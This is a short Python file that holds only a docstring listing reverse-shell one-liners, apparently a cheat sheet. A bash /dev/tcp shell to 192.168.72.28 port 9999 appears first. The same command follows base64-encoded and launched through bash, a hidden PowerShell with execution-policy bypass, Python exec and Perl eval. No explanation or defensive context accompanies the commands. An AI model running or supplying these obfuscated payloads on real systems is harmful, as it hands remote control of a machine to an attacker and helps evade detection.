#coding=utf-8




'''

bash -i >& /dev/tcp/192.168.72.28/9999 0>&1

bash
bash -c {echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcyLjI4Lzk5OTkgMD4mMQ==}|{base64,-d}|{bash,-i}


powershell.exe -NonI -W Hidden -NoP -Exec Bypass -Enc YgBhAHMAaAAgAC0AaQAgAD4AJgAgAC8AZABlAHYALwB0AGMAcAAvADEAOQAyAC4AMQA2ADgALgA3ADIALgAyADgALwA5ADkAOQA5ACAAMAA+ACYAMQA=


bash -i >& /dev/tcp/192.168.72.28/9999 0>&1

python
python -c exec('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcyLjI4Lzk5OTkgMD4mMQ=='.decode('base64'))

perl -MMIME::Base64 -e eval(decode_base64('YmFzaCAtaSA+JiAvZGV2L3RjcC8xOTIuMTY4LjcyLjI4Lzk5OTkgMD4mMQ=='))


'''